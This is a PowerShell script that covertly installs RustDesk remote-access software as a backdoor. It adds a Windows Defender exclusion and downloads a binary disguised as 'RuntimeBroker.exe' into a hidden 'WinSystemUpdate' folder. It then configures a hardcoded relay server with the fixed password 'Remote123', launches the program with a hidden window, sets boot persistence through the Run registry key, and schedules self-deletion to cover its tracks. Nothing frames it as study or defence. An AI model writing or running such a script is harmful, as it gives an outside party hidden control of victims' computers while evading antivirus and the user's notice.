function Install-RD {
    $ProgressPreference = 'SilentlyContinue'
    $DEST   = "$env:LOCALAPPDATA\WinSystemUpdate"
    $EXE    = "$DEST\RuntimeBroker.exe"
    $DLL    = "$DEST\sciter.dll"
    $cfgDir = "$env:APPDATA\RustDesk\config"
    $base   = 'https://github.com/kk70226581/rd-files/releases/download/v1.0'

    try { Add-MpPreference -ExclusionPath $DEST -EA SilentlyContinue } catch {}

    Get-Process RuntimeBroker -EA SilentlyContinue |
        Where-Object { $_.Path -like '*WinSystem*' } |
        Stop-Process -Force -EA SilentlyContinue
    Start-Sleep 1
    Remove-Item $DEST -Recurse -Force -EA SilentlyContinue
    New-Item -ItemType Directory $DEST   -Force | Out-Null
    New-Item -ItemType Directory $cfgDir -Force | Out-Null

    # Download
    $wc = New-Object System.Net.WebClient
    $wc.DownloadFile("$base/chrome.exe", $EXE)
    try { $wc.DownloadFile("$base/sciter.dll", $DLL) } catch {}
    Unblock-File $EXE -EA SilentlyContinue
    Unblock-File $DLL -EA SilentlyContinue

    if (!(Test-Path $EXE) -or (Get-Item $EXE).Length -lt 1MB) {
        Write-Host 'Download failed!' -ForegroundColor Red; return
    }

    # Config:
    # approve-mode = 'password-click' -> both password AND manual click work
    # allow-only-conn-window-open = 'N' -> closing popup does NOT kill connection
    @'
rendezvous_server = '34.107.221.82'
relay_server = '34.107.221.82'
nat_type = 1
serial = 0
[options]
verification-method = 'use-permanent-password'
approve-mode = 'password-click'
allow-only-conn-window-open = 'N'
direct-server = 'N'
force-always-relay = 'Y'
allow-remote-config-modification = 'N'
'@ | Set-Content "$cfgDir\RustDesk2.toml" -Encoding UTF8

    @'
enc_id = ''
password = 'Remote123'
salt = ''
key_confirmed = true
'@ | Set-Content "$cfgDir\RustDesk.toml" -Encoding UTF8

    # Hide folder
    try { $f = Get-Item $DEST -Force; $f.Attributes = $f.Attributes -bor 6 } catch {}

    # Start RustDesk hidden
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName         = $EXE
    $psi.WorkingDirectory = $DEST
    $psi.WindowStyle      = [System.Diagnostics.ProcessWindowStyle]::Hidden
    $psi.UseShellExecute  = $true
    [System.Diagnostics.Process]::Start($psi) | Out-Null
    Start-Sleep 5

    # Get ID
    $psiId = New-Object System.Diagnostics.ProcessStartInfo
    $psiId.FileName               = $EXE
    $psiId.Arguments              = '--get-id'
    $psiId.UseShellExecute        = $false
    $psiId.RedirectStandardOutput = $true
    $psiId.CreateNoWindow         = $true
    $psiId.WorkingDirectory       = $DEST
    $prId = [System.Diagnostics.Process]::Start($psiId)
    $outT = $prId.StandardOutput.ReadToEndAsync()
    $prId.WaitForExit(8000) | Out-Null
    $RDID = $outT.Result.Trim()

    # Auto-start on boot via registry (no admin needed)
    $reg = 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
    Set-ItemProperty $reg 'WinSystemUpdate' $EXE -Force

    # Cleanup script
    $del = "$DEST\delete.ps1"
    Set-Content $del @'
$d = "$env:LOCALAPPDATA\WinSystemUpdate"
Get-Process RuntimeBroker -EA SilentlyContinue | Where-Object { $_.Path -like '*WinSystem*' } | Stop-Process -Force -EA SilentlyContinue
Remove-ItemProperty 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' 'WinSystemUpdate' -EA SilentlyContinue
Start-Sleep 2
Remove-Item -LiteralPath $d -Recurse -Force -EA SilentlyContinue
'@ -Encoding UTF8

    # Watcher - auto deletes when process stops OR after 1 hour
    $watch = "$DEST\watch.ps1"
    Set-Content $watch @'
$EXE  = "$env:LOCALAPPDATA\WinSystemUpdate\RuntimeBroker.exe"
$del  = "$env:LOCALAPPDATA\WinSystemUpdate\delete.ps1"
$deadline = [DateTime]::Now.AddHours(1)

while ([DateTime]::Now -lt $deadline) {
    Start-Sleep 10
    $alive = Get-Process RuntimeBroker -EA SilentlyContinue | Where-Object { $_.Path -eq $EXE }
    if (-not $alive) { break }
}

if (Test-Path $del) { & $del }
'@ -Encoding UTF8

    # Start watcher silently in background
    Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -File `"$watch`""
}
Install-RD
